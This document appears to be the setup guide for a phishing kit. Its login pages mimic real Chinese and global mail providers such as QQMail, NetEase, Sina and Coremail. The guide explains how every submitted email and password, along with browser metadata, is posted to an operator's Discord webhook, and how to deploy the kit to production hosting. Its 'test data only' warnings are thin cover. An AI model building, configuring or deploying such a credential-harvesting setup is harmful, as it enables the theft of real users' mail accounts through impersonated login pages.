# Discord Integration Setup Guide

## Overview
This application now submits all form data from login pages to a Discord channel via webhook integration. Form submissions include email/username, password, theme name, and other relevant data.

## Setup Instructions

### Step 1: Create a Discord Webhook

1. **Open your Discord server**
2. **Go to channel settings** - Right-click on the channel where you want to receive form submissions
3. **Select "Edit Channel"**
4. **Navigate to "Integrations"** in the left sidebar
5. **Click "Webhooks"**
6. **Create a New Webhook**
   - Name it something like "Form Submissions Bot"
   - (Optional) Upload an avatar
7. **Copy the Webhook URL** - It will look like:
   ```
   https://discordapp.com/api/webhooks/1234567890/abcdefghijklmnop
   ```

### Step 2: Configure the Application

1. **Locate the `.env` file** in the root directory
2. **Open `.env` and add your webhook URL:**
   ```
   VITE_DISCORD_WEBHOOK_URL=https://discordapp.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
   ```
3. **Save the file**

### Step 3: Test the Integration

1. **Start the development server:**
   ```bash
   npm run dev
   ```
2. **Navigate to any login form** (different themes available)
3. **Fill in the form** with test credentials
4. **Submit the form**
5. **Check your Discord channel** - you should see a formatted embed message with the form data

## How It Works

When a user submits any login form in the app:

1. The form data is captured (email, password, theme, language, etc.)
2. Form validation and security checks still occur
3. The data is formatted as a Discord embed message
4. An HTTP POST request is sent to your Discord webhook
5. The message appears in your Discord channel with:
   - **Title**: Form type (LoginForm, BossmailTheme, etc.)
   - **Fields**: All form data
   - **Timestamp**: When the submission occurred
   - **User Agent**: Browser information

## Available Themes with Discord Integration

All the following themes now submit form data to Discord:

- AlibabaTheme (uses LoginForm component)
- BossmailTheme
- Theme263
- QQMailTheme
- SinaTheme
- SohuTheme
- NetEaseTheme
- CoremailTheme
- GlobalMailTheme

## Discord Embed Format

Each form submission appears as a nicely formatted Discord embed with:
- Theme/form name
- Email or username
- Password
- Additional metadata (language, tab, login type, etc.)
- Timestamp
- User Agent string

## Security Notes

⚠️ **IMPORTANT SECURITY WARNINGS:**

1. **Never commit `.env` file** - The .env file contains your webhook URL and should NOT be committed to version control
2. **Webhook URL is sensitive** - Treat your webhook URL like a password. Anyone with it can post to your Discord channel
3. **Test data only** - Only use test credentials when testing this feature
4. **Consider privacy** - Form data including passwords is being sent to Discord; ensure this complies with your privacy policies

## Environment Variables

| Variable | Description | Example |
|----------|-------------|---------|
| `VITE_DISCORD_WEBHOOK_URL` | Your Discord webhook URL | `https://discordapp.com/api/webhooks/...` |

## Disabling Discord Integration

If you want to disable Discord submissions temporarily:

1. Open `.env` and leave `VITE_DISCORD_WEBHOOK_URL` empty
2. The app will log a warning but continue to work normally
3. Forms will submit successfully without Discord notifications

## Troubleshooting

### Messages not appearing in Discord?

1. **Check the webhook URL** - Ensure it's copied correctly
2. **Verify webhook exists** - The webhook might have been deleted
3. **Check browser console** - Look for error messages in the browser developer tools
4. **Test with `curl`**:
   ```bash
   curl -X POST https://discordapp.com/api/webhooks/YOUR_ID/YOUR_TOKEN \
     -H "Content-Type: application/json" \
     -d '{"content":"Test message"}'
   ```

### Webhook URL invalid error?

- Verify the complete URL was copied
- Ensure no extra spaces or characters
- Recreate the webhook if needed

### "Discord webhook error: 404"?

- The webhook has been deleted
- Create a new webhook and update `.env`

## Production Deployment

When deploying to production (e.g., Cloudflare Pages):

1. **Set the environment variable** in your hosting provider's dashboard
2. For **Cloudflare Pages**: Add the environment variable in project settings
3. Ensure the webhook URL is stored securely
4. Never expose the webhook URL in logs or error messages

## Support

For Discord webhook documentation, visit: https://discord.com/developers/docs/resources/webhook
